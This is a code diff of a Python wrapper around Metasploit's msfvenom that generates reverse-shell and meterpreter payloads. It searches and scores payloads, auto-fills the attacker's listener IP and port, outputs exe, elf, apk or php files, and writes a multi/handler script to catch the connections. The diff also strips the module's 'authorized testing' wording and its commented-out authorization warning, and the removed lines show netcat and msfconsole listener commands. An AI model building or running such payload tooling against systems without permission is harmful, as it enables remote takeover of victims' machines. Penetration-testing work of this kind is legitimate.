@@ -1,274 +1,410 @@
-"""kernox.tools.msfvenom – Payload generation for authorized testing."""
+"""kernox.tools.msfvenom – The Full Advanced Smart Payload Generator."""
 
 from __future__ import annotations
 import subprocess
 import re
+import socket
+import os
+import json
 from rich.console import Console
 from rich.prompt import Prompt, Confirm
 from rich.table import Table
 from rich.panel import Panel
-from rich import box
+from rich.progress import Progress, SpinnerColumn, TextColumn
 
 console = Console()
 
 
 class MsfvenomTool:
     name = "msfvenom"
-    # _authorization_shown = False
+    CACHE_FILE = os.path.expanduser("~/.kernox/msfvenom_cache.json")
 
+    def __init__(self):
+        self._payload_cache = None
+        self._payload_descriptions = {}
+        self._cache_loaded = False
+        self._last_output = None
+        self._last_command = None
+
+    # --- VALIDATION ---
     def _validate_ip(self, ip: str) -> bool:
-        """Validate IP address format."""
-        if not ip:
-            return False
-        # Check for valid IPv4
-        pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
-        if re.match(pattern, ip):
-            parts = ip.split('.')
-            for part in parts:
-                if int(part) > 255:
-                    return False
+        try:
+            socket.inet_aton(ip)
             return True
-        return False
+        except:
+            return False
 
     def _validate_port(self, port: str) -> bool:
-        """Validate port number."""
         try:
-            port_num = int(port)
-            return 1 <= port_num <= 65535
-        except ValueError:
+            return 1 <= int(port) <= 65535
+        except:
             return False
 
-    def build_command(self, **kwargs) -> str:
-        """Build msfvenom command."""
-        payload = kwargs.get("payload", "")
-        lhost = kwargs.get("lhost", "")
-        lport = kwargs.get("lport", "")
-        format_type = kwargs.get("format", "")
-        output = kwargs.get("output", "")
-
-        # Show authorization warning only once per session
-        # if not MsfvenomTool._authorization_shown:
-        #     console.print(Panel(
-        #         "[dim]Remember: Only use on systems you have permission to test[/dim]",
-        #         title="[bold yellow]Authorized Use Only[/bold yellow]",
-        #         border_style="yellow",
-        #         box=box.ROUNDED,
-        #     ))
-        #     MsfvenomTool._authorization_shown = True
-
-        # If no payload, ask interactively
-        if not payload or "please provide" in payload.lower():
-            payload = self._interactive_payload_selection()
-
-        # If no format, ask
-        if not format_type:
-            format_type = self._select_format(payload)
-
-        cmd_parts = ["msfvenom", "-p", payload]
-
-        # ALWAYS ask for LHOST if it's a reverse shell payload
-        if self._needs_lhost(payload):
-            console.print("\n[bold cyan]Reverse Shell Configuration[/bold cyan]")
-            while True:
-                lhost = Prompt.ask("[cyan]LHOST (your listener IP)[/cyan]")
-                if self._validate_ip(lhost):
-                    break
-                console.print("[red]Invalid IP address. Please enter a valid IP (e.g., 192.168.1.100)[/red]")
-            cmd_parts.append(f"LHOST={lhost}")
-
-        # ALWAYS ask for LPORT if needed
-        if self._needs_lport(payload):
-            while True:
-                lport = Prompt.ask("[cyan]LPORT[/cyan]", default="4444")
-                if self._validate_port(lport):
-                    break
-                console.print("[red]Invalid port. Please enter a number between 1 and 65535[/red]")
-            cmd_parts.append(f"LPORT={lport}")
-
-        # Add format
-        if format_type and format_type != "raw":
-            cmd_parts.extend(["-f", format_type])
-
-        # Generate output filename if not provided
-        if not output:
-            clean_name = payload.replace("/", "_").replace(" ", "_")
-            ext_map = {
-                "exe": ".exe", "elf": ".elf", "php": ".php", "py": ".py",
-                "pl": ".pl", "rb": ".rb", "jsp": ".jsp", "war": ".war",
-                "ps1": ".ps1", "vbs": ".vbs", "apk": ".apk", "raw": ".bin",
-                "python": ".py", "perl": ".pl",
-            }
-            ext = ext_map.get(format_type, ".bin")
-            output = f"/tmp/msfvenom_{clean_name}{ext}"
-
-        cmd_parts.extend(["-o", output])
+    # --- CACHE ---
+    def _ensure_payload_cache(self):
+        if self._cache_loaded:
+            return
         
-        # Show summary
-        console.print("\n[bold cyan]Payload Details:[/bold cyan]")
-        console.print(f"  * Payload: [yellow]{payload}[/yellow]")
-        if lhost and self._validate_ip(lhost):
-            console.print(f"  * Listener: [yellow]{lhost}:{lport}[/yellow]")
-        console.print(f"  * Format: [yellow]{format_type}[/yellow]")
-        console.print(f"  * Output: [yellow]{output}[/yellow]")
-        console.print()
-        
-        # Show listener command
-        if lhost and self._validate_ip(lhost) and lport and self._validate_port(lport):
-            console.print("[bold green]Start listener:[/bold green]")
-            console.print(f"  [cyan]nc -lvnp {lport}[/cyan]")
-            if "meterpreter" in payload.lower():
-                console.print(f"  [cyan]msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD {payload}; set LHOST {lhost}; set LPORT {lport}; run'[/cyan]")
-            console.print()
-        
-        return " ".join(cmd_parts)
+        if os.path.exists(self.CACHE_FILE):
+            try:
+                with open(self.CACHE_FILE, 'r') as f:
+                    cache = json.load(f)
+                    self._payload_cache = cache.get('payloads', [])
+                    self._payload_descriptions = cache.get('descriptions', {})
+                    self._cache_loaded = True
+                    return
+            except:
+                pass
 
-    def _needs_lhost(self, payload: str) -> bool:
-        """Check if payload requires LHOST."""
-        reverse_keywords = ["reverse", "meterpreter", "shell_reverse"]
-        return any(kw in payload.lower() for kw in reverse_keywords)
+        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), transient=True) as progress:
+            progress.add_task(description="Indexing MSFvenom payloads...", total=None)
+            try:
+                result = subprocess.run(["msfvenom", "-l", "payloads"], capture_output=True, text=True, timeout=20)
+                payloads, descriptions = [], {}
+                for line in result.stdout.split("\n"):
+                    if line.strip() and not any(line.startswith(x) for x in ["=", "Name", "-", " "]):
+                        parts = line.strip().split(maxsplit=1)
+                        if parts:
+                            p_name = parts[0]
+                            payloads.append(p_name)
+                            descriptions[p_name] = parts[1] if len(parts) > 1 else ""
+                
+                self._payload_cache, self._payload_descriptions = payloads, descriptions
+                os.makedirs(os.path.dirname(self.CACHE_FILE), exist_ok=True)
+                with open(self.CACHE_FILE, 'w') as f:
+                    json.dump({'payloads': payloads, 'descriptions': descriptions}, f)
+                self._cache_loaded = True
+            except:
+                self._payload_cache = ["windows/x64/meterpreter/reverse_tcp", "linux/x86/shell_reverse_tcp"]
 
-    def _needs_lport(self, payload: str) -> bool:
-        """Check if payload requires LPORT."""
-        port_keywords = ["reverse", "bind", "meterpreter", "shell_reverse", "shell_bind"]
-        return any(kw in payload.lower() for kw in port_keywords)
-
-    def _select_format(self, payload: str) -> str:
-        """Ask user which format to save the payload."""
-        console.print("\n[bold cyan]Output format:[/bold cyan]")
+    # --- INTENT PARSING ---
+    def _parse_intent(self, user_input: str) -> dict:
+        input_lower = user_input.lower()
         
-        # Suggest format based on payload
-        suggested_formats = []
-        if "windows" in payload.lower():
-            suggested_formats = ["exe", "ps1", "vbs", "raw"]
-        elif "linux" in payload.lower():
-            suggested_formats = ["elf", "python", "perl", "raw"]
-        elif "php" in payload.lower():
-            suggested_formats = ["php", "raw"]
-        elif "python" in payload.lower() or "py" in payload.lower():
-            suggested_formats = ["py", "raw"]
-        elif "perl" in payload.lower() or "pl" in payload.lower():
-            suggested_formats = ["pl", "raw"]
-        elif "java" in payload.lower() or "jsp" in payload.lower():
-            suggested_formats = ["jsp", "war", "raw"]
-        elif "android" in payload.lower():
-            suggested_formats = ["apk", "raw"]
-        else:
-            suggested_formats = ["raw", "exe", "elf", "php", "py", "pl", "rb", "jsp", "war"]
-        
-        # Display formats
-        format_table = Table(show_header=False, box=box.SIMPLE)
-        format_table.add_column("#", style="bold cyan", width=4)
-        format_table.add_column("Format", style="bold green", width=12)
-        format_table.add_column("Description", style="dim")
-        
-        formats_desc = {
-            "exe": "Windows executable",
-            "elf": "Linux executable",
-            "php": "PHP script",
-            "py": "Python script",
-            "pl": "Perl script",
-            "rb": "Ruby script",
-            "jsp": "Java Server Pages",
-            "war": "Web archive",
-            "ps1": "PowerShell script",
-            "vbs": "VBScript",
-            "apk": "Android package",
-            "raw": "Raw binary",
+        intent = {
+            "platform": None,
+            "type": "reverse",
+            "style": "shell",
+            "protocol": "tcp",
+            "original": user_input
         }
         
-        for i, fmt in enumerate(suggested_formats[:10], 1):
-            desc = formats_desc.get(fmt, "Generic")
-            format_table.add_row(str(i), fmt, desc)
+        platforms = {
+            "windows": ["windows", "win", "exe"],
+            "linux": ["linux", "nix", "elf"],
+            "php": ["php"],
+            "python": ["python", "py"],
+            "android": ["android", "apk"],
+            "java": ["java", "jsp", "war"]
+        }
         
-        console.print(format_table)
-        console.print(f"  {len(suggested_formats)+1}. [cyan]Custom[/cyan]\n")
+        for plat, triggers in platforms.items():
+            if any(t in input_lower for t in triggers):
+                intent["platform"] = plat
+                break
+        
+        if "bind" in input_lower:
+            intent["type"] = "bind"
+        
+        if "meterpreter" in input_lower:
+            intent["style"] = "meterpreter"
+        
+        if "https" in input_lower:
+            intent["protocol"] = "https"
+        elif "http" in input_lower:
+            intent["protocol"] = "http"
+        
+        return intent
+
+    # --- PAYLOAD SCORING ---
+    def _score_payload(self, payload: str, intent: dict) -> int:
+        payload_lower = payload.lower()
+        score = 0
+        
+        if intent["platform"] and intent["platform"] in payload_lower:
+            score += 40
+        if intent["type"] in payload_lower:
+            score += 30
+        if intent["protocol"] in payload_lower:
+            score += 20
+        if intent["style"] in payload_lower:
+            score += 25
+        
+        for word in intent["original"].lower().split():
+            if len(word) > 3 and word in payload_lower:
+                score += 5
+        
+        return score
+
+    # --- PAYLOAD SEARCH ---
+    def _find_payloads(self, intent: dict) -> list:
+        self._ensure_payload_cache()
+        
+        if intent["platform"]:
+            candidates = [p for p in self._payload_cache if intent["platform"] in p.lower()]
+        else:
+            candidates = self._payload_cache
+        
+        scored = []
+        for p in candidates:
+            score = self._score_payload(p, intent)
+            if score > 0:
+                scored.append({"payload": p, "score": score, "desc": self._payload_descriptions.get(p, "")[:80]})
+        
+        scored.sort(key=lambda x: x["score"], reverse=True)
+        return scored[:15]
+
+    # --- PAYLOAD SELECTION WITH PAGINATION ---
+    def _select_payload(self, intent: dict) -> str:
+        matches = self._find_payloads(intent)
+        final_list = [m["payload"] for m in matches]
+        
+        if not final_list:
+            console.print("[yellow]No matches found. Enter payload manually.[/yellow]")
+            return Prompt.ask("[cyan]Payload[/cyan]")
+        
+        offset, limit = 0, 10
+        
+        while True:
+            page = final_list[offset:offset+limit]
+            console.print(f"\n[bold green]🔍 Matching Payloads (Page {offset//10 + 1}):[/bold green]")
+            for i, p in enumerate(page, 1):
+                desc = self._payload_descriptions.get(p, "")[:60]
+                console.print(f"  {i}. [yellow]{p}[/yellow]")
+                if desc:
+                    console.print(f"     [dim]{desc}...[/dim]")
+            
+            console.print(f"\n[cyan]Options:[/cyan] [green]#[/green] select | [cyan]n/next[/cyan] next | [cyan]p/prev[/cyan] prev | [cyan]s/search[/cyan] search | [cyan]q/quit[/cyan] quit")
+            choice = Prompt.ask("Select", default="1").strip().lower()
+            
+            # Pagination
+            if choice in ['n', 'next']:
+                if offset + limit < len(final_list):
+                    offset += limit
+                else:
+                    console.print("[yellow]No more pages[/yellow]")
+                continue
+            elif choice in ['p', 'prev']:
+                if offset - limit >= 0:
+                    offset -= limit
+                else:
+                    console.print("[yellow]Already at first page[/yellow]")
+                continue
+            elif choice in ['s', 'search']:
+                new_search = Prompt.ask("[cyan]Enter search keywords[/cyan]")
+                new_intent = self._parse_intent(new_search)
+                new_matches = self._find_payloads(new_intent)
+                if new_matches:
+                    final_list = [m["payload"] for m in new_matches]
+                    offset = 0
+                else:
+                    console.print("[yellow]No matches found[/yellow]")
+                continue
+            elif choice in ['q', 'quit']:
+                return None
+            elif choice.isdigit() and 1 <= int(choice) <= len(page):
+                return page[int(choice)-1]
+            elif len(choice) > 1:
+                return choice
+            else:
+                console.print("[red]Invalid selection[/red]")
+
+    # --- IP MENU ---
+    def _get_ips(self) -> list:
+        ips = []
+        try:
+            result = subprocess.run(["ip", "-4", "addr", "show"], capture_output=True, text=True)
+            for line in result.stdout.split("\n"):
+                if "inet " in line and "127.0.0.1" not in line:
+                    parts = line.strip().split()
+                    for i, part in enumerate(parts):
+                        if part == "inet" and i + 1 < len(parts):
+                            ip = parts[i+1].split('/')[0]
+                            ips.append(ip)
+        except:
+            pass
+        
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80))
+            ip = s.getsockname()[0]
+            s.close()
+            if ip not in ips:
+                ips.append(ip)
+        except:
+            pass
+        
+        return ips if ips else ["192.168.1.100"]
+
+    def _select_ip(self) -> str:
+        ips = self._get_ips()
+        
+        console.print("\n[bold cyan]📡 Select LHOST:[/bold cyan]")
+        for i, ip in enumerate(ips, 1):
+            console.print(f"  {i}. [yellow]{ip}[/yellow]")
+        console.print(f"  {len(ips)+1}. [cyan]Enter custom IP[/cyan]")
         
         choice = Prompt.ask("Select", default="1")
-        
-        if int(choice) == len(suggested_formats) + 1:
-            return Prompt.ask("[cyan]Enter custom format[/cyan]")
-        else:
-            return suggested_formats[int(choice)-1]
+        if choice.isdigit():
+            idx = int(choice)
+            if 1 <= idx <= len(ips):
+                return ips[idx-1]
+            elif idx == len(ips) + 1:
+                ip = Prompt.ask("[cyan]Enter custom IP[/cyan]")
+                if self._validate_ip(ip):
+                    return ip
+                console.print("[red]Invalid IP, using default[/red]")
+                return ips[0]
+        return ips[0]
 
-    def _interactive_payload_selection(self) -> str:
-        """Interactive menu for payload selection."""
-        console.print("\n[bold cyan]Payload type:[/bold cyan]")
-        console.print("  1. [green]Windows[/green] (reverse shells)")
-        console.print("  2. [green]Linux[/green] (reverse shells)")
-        console.print("  3. [green]PHP[/green] (web shells)")
-        console.print("  4. [green]Python[/green] (reverse shells)")
-        console.print("  5. [green]Java[/green] (JSP shells)")
-        console.print("  6. [green]Custom[/green]\n")
-
-        choice = Prompt.ask("Select", choices=["1","2","3","4","5","6"], default="1")
-
-        payloads = {
-            "1": [
-                "windows/x64/meterpreter/reverse_tcp",
-                "windows/shell_reverse_tcp",
-                "windows/x64/shell_reverse_tcp",
-            ],
-            "2": [
-                "linux/x64/meterpreter/reverse_tcp",
-                "linux/x86/shell_reverse_tcp",
-                "linux/x64/shell_reverse_tcp",
-            ],
-            "3": [
-                "php/meterpreter_reverse_tcp",
-                "php/reverse_php",
-            ],
-            "4": [
-                "python/meterpreter/reverse_tcp",
-                "python/shell_reverse_tcp",
-            ],
-            "5": [
-                "java/jsp_shell_reverse_tcp",
-                "java/shell_reverse_tcp",
-            ],
+    # --- FORMAT SELECTION ---
+    def _select_format(self, payload: str) -> str:
+        formats = {
+            "windows": ["exe", "ps1", "vbs", "msi", "raw"],
+            "linux": ["elf", "sh", "raw"],
+            "php": ["php", "raw"],
+            "python": ["py", "raw"],
+            "android": ["apk", "raw"],
+            "java": ["jar", "jsp", "war", "raw"]
         }
+        
+        platform = "unknown"
+        for plat in formats.keys():
+            if plat in payload.lower():
+                platform = plat
+                break
+        
+        fmt_list = formats.get(platform, ["exe", "elf", "raw"])
+        
+        console.print("\n[bold cyan]📦 Select Format:[/bold cyan]")
+        for i, f in enumerate(fmt_list, 1):
+            console.print(f"  {i}. [yellow]{f}[/yellow]")
+        
+        choice = Prompt.ask("Select", default="1")
+        if choice.isdigit() and 1 <= int(choice) <= len(fmt_list):
+            return fmt_list[int(choice)-1]
+        return fmt_list[0]
 
-        if choice == "6":
-            return Prompt.ask("[cyan]Enter payload[/cyan]")
-        else:
-            console.print("\n[bold cyan]Select:[/bold cyan]")
-            for i, p in enumerate(payloads[choice], 1):
-                console.print(f"  {i}. {p}")
-            console.print(f"  {len(payloads[choice])+1}. Custom\n")
-            p_choice = Prompt.ask("Select", default="1")
-            if int(p_choice) == len(payloads[choice]) + 1:
-                return Prompt.ask("[cyan]Enter payload[/cyan]")
-            else:
-                return payloads[choice][int(p_choice)-1]
+    # --- OUTPUT PATH ---
+    def _get_output_path(self, payload: str, lport: str, fmt: str) -> str:
+        clean = payload.replace("/", "_")
+        ext_map = {"exe": ".exe", "elf": ".elf", "php": ".php", "py": ".py", "apk": ".apk", 
+                   "ps1": ".ps1", "vbs": ".vbs", "msi": ".msi", "sh": ".sh", "jar": ".jar", 
+                   "jsp": ".jsp", "war": ".war", "raw": ".bin"}
+        ext = ext_map.get(fmt, ".bin")
+        return f"/tmp/msfvenom_{clean}_{lport}{ext}"
+
+    # --- MAIN ---
+    def build_command(self, **kwargs) -> str:
+        user_input = kwargs.get("payload", "")
+        if not user_input:
+            return ""
+        
+        # Parse AI intent
+        intent = self._parse_intent(user_input)
+        console.print(f"\n[cyan]🎯 Understanding: {user_input}[/cyan]")
+        
+        # Find and select payload
+        payload = self._select_payload(intent)
+        if not payload:
+            return ""
+        
+        is_reverse = "reverse" in payload.lower()
+        
+        # LHOST (only for reverse)
+        lhost = None
+        if is_reverse:
+            lhost = self._select_ip()
+        
+        # LPORT
+        console.print("\n[bold cyan]🔌 LPORT:[/bold cyan]")
+        lport = Prompt.ask("Enter port", default="443")
+        while not self._validate_port(lport):
+            lport = Prompt.ask("[red]Invalid[/red] Enter port", default="443")
+        
+        # Format
+        fmt = self._select_format(payload)
+        
+        # Output path
+        output = self._get_output_path(payload, lport, fmt)
+        
+        # Build command
+        cmd = ["msfvenom", "-p", payload]
+        if is_reverse and lhost:
+            cmd.append(f"LHOST={lhost}")
+        cmd.append(f"LPORT={lport}")
+        cmd.extend(["-f", fmt, "-o", output])
+        
+        # Store for parse method
+        self._last_output = output
+        self._last_command = " ".join(cmd)
+        
+        # Summary
+        summary = Table(title="Payload Configuration", box=None)
+        summary.add_column("Option", style="cyan")
+        summary.add_column("Value", style="yellow")
+        summary.add_row("Payload", payload)
+        if is_reverse and lhost:
+            summary.add_row("LHOST", lhost)
+        summary.add_row("LPORT", lport)
+        summary.add_row("Format", fmt)
+        summary.add_row("Output", output)
+        console.print(Panel(summary, border_style="green"))
+        
+        # Confirmation
+        if not Confirm.ask("\n[bold yellow]Generate?[/bold yellow]", default=True):
+            return ""
+        
+        # Handler RC
+        rc_path = output + ".rc"
+        with open(rc_path, 'w') as f:
+            f.write(f"use exploit/multi/handler\nset PAYLOAD {payload}\n")
+            if is_reverse and lhost:
+                f.write(f"set LHOST {lhost}\n")
+            f.write(f"set LPORT {lport}\nset ExitOnSession false\nexploit -j -z\n")
+        
+        console.print(f"\n[green]✓ Handler: {rc_path}[/green]")
+        console.print(f"[dim]msfconsole -q -r {rc_path}[/dim]")
+        
+        return " ".join(cmd)
 
     def parse(self, output: str) -> dict:
         """Parse msfvenom output."""
-        output_file = ""
         success = False
+        output_file = None
+        size = 0
         
-        # Look for success message
-        if "Saved as:" in output or "written to" in output:
+        # Check for "Saved as:" in output
+        if "Saved as:" in output:
             success = True
-            
-            # Extract output file path
-            patterns = [
-                r"Saved as: (.+)",
-                r"written to (.+)",
-                r"Payload size: .+ bytes\s+(.+)",
-            ]
-            for pattern in patterns:
-                match = re.search(pattern, output)
-                if match:
-                    output_file = match.group(1).strip()
-                    break
+            match = re.search(r"Saved as:\s*(.+)", output)
+            if match:
+                output_file = match.group(1).strip()
         
-        # Extract payload size if available
-        size_match = re.search(r"Payload size: (\d+) bytes", output)
-        payload_size = int(size_match.group(1)) if size_match else 0
+        # Fallback for "written to"
+        elif "written to" in output:
+            success = True
+            match = re.search(r"written to\s*(.+)", output)
+            if match:
+                output_file = match.group(1).strip()
+        
+        # Use stored output path if not found
+        if not output_file and hasattr(self, '_last_output'):
+            output_file = self._last_output
+            if output_file and os.path.exists(output_file):
+                success = True
+        
+        # Get file size if exists
+        if output_file and os.path.exists(output_file):
+            size = os.path.getsize(output_file)
+            console.print(f"\n[green]✓ Payload generated: {size:,} bytes[/green]")
+            console.print(f"[green]📁 {output_file}[/green]")
+        elif success:
+            console.print(f"\n[green]✓ Payload generated successfully![/green]")
         
         return {
-            "payload": "generated",
             "success": success,
             "output_file": output_file,
-            "size": payload_size,
-            "raw": output,
+            "size": size,
+            "raw": output
         }
